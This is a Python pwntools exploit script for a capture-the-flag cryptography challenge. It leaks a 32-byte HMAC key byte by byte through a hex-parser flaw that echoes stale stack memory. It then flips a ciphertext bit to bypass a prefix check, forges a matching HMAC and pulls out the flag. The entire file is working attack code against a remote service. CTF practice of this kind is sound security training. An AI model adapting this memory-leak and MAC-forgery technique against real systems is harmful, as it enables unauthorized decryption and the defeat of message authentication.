#!/usr/bin/env python3
from pwn import *
import hmac, hashlib, re, sys

HOST = args.HOST or 'chals.cyberjousting.com'
PORT = int(args.PORT or 1362)

def recv_line_containing(io, marker, timeout=10):
    line = io.recvline(timeout=timeout)
    while line and marker not in line:
        if args.DEBUG_LINES:
            print(line.decode(errors='replace'), end='')
        line = io.recvline(timeout=timeout)
    if not line:
        raise EOFError(f'missing marker {marker!r}')
    return line

def hex_from_field_bytes(field):
    """
    Parse only the actual value field, never the label.
    Accepts fields like:
      b' deadbeef\n'
      b'deadbeef'
    """
    field = field.strip()
    # Keep only the first whitespace-separated token after the marker.
    if not field:
        return None
    tok = field.split()[0]
    # Value must be even-length hex.
    if not re.fullmatch(rb'[0-9a-fA-F]*', tok) or len(tok) % 2:
        raise ValueError(f'not clean hex field: {field!r}, token={tok!r}')
    return bytes.fromhex(tok.decode())

def parse_hex_after(io, marker):
    line = recv_line_containing(io, marker)
    rest = line.split(marker, 1)[1]
    val = hex_from_field_bytes(rest)
    if val is not None:
        return val

    # In case the program prints the marker and flushes before print_hex_array output.
    line2 = io.recvline(timeout=10)
    val = hex_from_field_bytes(line2)
    if val is None:
        raise ValueError(f'could not parse hex after {marker!r}: {line!r} / {line2!r}')
    return val

def parse_decrypting_echo(io):
    marker = b'Decrypting message'
    line = recv_line_containing(io, marker)
    rest = line.split(marker, 1)[1]
    try:
        val = hex_from_field_bytes(rest)
        if val is not None:
            return val, line
    except ValueError:
        # This should not happen after splitting, but keep diagnostics.
        pass

    line2 = io.recvline(timeout=10)
    val = hex_from_field_bytes(line2)
    if val is None:
        raise ValueError(f'no clean leak hex after marker: {line!r} / {line2!r}')
    return val, line + line2

def read_round_header(io):
    ct = parse_hex_after(io, b'Encrypted data:')
    tag = parse_hex_after(io, b'Poly1305 authentication tag:')
    hm = parse_hex_after(io, b'HMAC tag:')
    log.info(f'round header: ct_len={len(ct)} ct={ct.hex()} tag={tag.hex()} hmac={hm.hex()}')
    return ct, tag, hm

def send_leak_round(io, idx):
    ct, tag, hm = read_round_header(io)

    # Hex parser bug:
    # after idx valid bytes, send invalid pair. Parser returns idx+1 but does not
    # overwrite byte idx, leaking stale stack content, expected hmacKey[idx].
    bad_ct_hex = ('00' * idx + 'zz').encode()

    io.sendlineafter(b'>>> Enter a ciphertext to decrypt:', bad_ct_hex)
    io.sendlineafter(b'>>> Enter an IV for the message:', b'303132333435363738396162')
    io.sendlineafter(b'>>> Enter a Poly1305 authentication tag for the message:', b'00' * 16)
    io.sendlineafter(b'>>> Enter an HMAC tag for the message:', b'00' * 32)

    leak, raw_line = parse_decrypting_echo(io)

    if len(leak) < idx + 1:
        raise ValueError(f'leak too short for idx={idx}: len={len(leak)} leak={leak.hex()} raw={raw_line!r}')
    if len(leak) != idx + 1:
        log.warning(f'expected echo length {idx+1}, got {len(leak)}: {leak.hex()}')

    leaked_byte = leak[idx]
    log.success(f'hmacKey[{idx:02d}] = {leaked_byte:02x}')

    # The invalid HMAC line may remain before the next round; read_round_header skips it.
    return leaked_byte, ct, tag, hm

def final_round(io, key):
    ct, tag, hm = read_round_header(io)
    log.info(f'using hmac key = {key.hex()}')

    forged_ct = bytearray(ct)
    # Known flag starts with b'byuctf{'. Flip first plaintext byte from 'b' to 'c',
    # bypassing the service's byu-prefix check.
    forged_ct[0] ^= 1
    forged_ct = bytes(forged_ct)

    forged_hmac = hmac.new(key, forged_ct + tag, hashlib.sha256).digest()
    log.info(f'forged ct   = {forged_ct.hex()}')
    log.info(f'orig tag    = {tag.hex()}')
    log.info(f'forged hmac = {forged_hmac.hex()}')

    io.sendlineafter(b'>>> Enter a ciphertext to decrypt:', forged_ct.hex().encode())
    io.sendlineafter(b'>>> Enter an IV for the message:', b'303132333435363738396162')
    io.sendlineafter(b'>>> Enter a Poly1305 authentication tag for the message:', tag.hex().encode())
    io.sendlineafter(b'>>> Enter an HMAC tag for the message:', forged_hmac.hex().encode())

    data = io.recvrepeat(3)
    print(data.decode(errors='replace'))

    # Search for any hex-encoded plaintext line. Avoid label text by taking clean tokens.
    candidates = []
    for tok in re.findall(rb'\b[0-9a-fA-F]{8,256}\b', data):
        if len(tok) % 2 == 0:
            try:
                b = bytes.fromhex(tok.decode())
            except Exception:
                continue
            candidates.append(b)

    for pt in candidates:
        if not pt:
            continue
        fixed = bytes([pt[0] ^ 1]) + pt[1:]
        if b'byuctf{' in fixed:
            flag = fixed[fixed.index(b'byuctf{'):]
            flag = flag.split(b'}', 1)[0] + b'}'
            log.success(f'FLAG: {flag.decode(errors="replace")}')
            return flag

    log.failure('No plaintext flag candidate found. Re-run with DEBUG_LINES=1 and paste final output.')

def main():
    context.log_level = args.LOG or 'info'
    if args.LOCAL:
        io = process(args.BIN or './challenge')
    else:
        io = remote(HOST, PORT)

    key = bytearray()
    for i in range(32):
        b, ct, tag, hm = send_leak_round(io, i)
        key.append(b)

    final_round(io, bytes(key))

if __name__ == '__main__':
    main()
